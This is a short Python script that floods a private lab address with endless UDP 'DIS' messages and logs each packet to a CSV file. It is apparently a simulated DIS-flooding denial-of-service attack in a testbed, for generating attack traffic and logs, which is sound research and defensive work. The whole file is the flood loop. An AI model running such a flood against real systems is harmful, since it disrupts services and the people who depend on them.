import socket
import time
from datetime import datetime
import csv
import os

TARGET_IP = "172.20.0.100"
PORT = 9999
LOG_FILE = "logs/flood_attacker.csv"

os.makedirs("logs", exist_ok=True)
log = open(LOG_FILE, "a", newline="")
writer = csv.writer(log)

if os.stat(LOG_FILE).st_size == 0:
    writer.writerow(["timestamp","event","src","dst","info"])


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def dis_flood_attack():
    payload = b"DIS:HelpMe"

    print(f"--- LAUNCHING DIS FLOOD ATTACK ON {TARGET_IP} ---")

    packet_count = 0

    while True:
        sock.sendto(payload, (TARGET_IP, PORT))

        packet_count += 1
        now = datetime.now().strftime("%H:%M:%S")

        if packet_count % 100 == 0:
            print(f"[{now}] [ATTACK] Sent {packet_count} DIS packets")

        writer.writerow([now, "DIS_ATTACK", os.getenv("MY_IP", "172.20.0.XX"), TARGET_IP, "flood"])
        log.flush()



time.sleep(5)
dis_flood_attack()
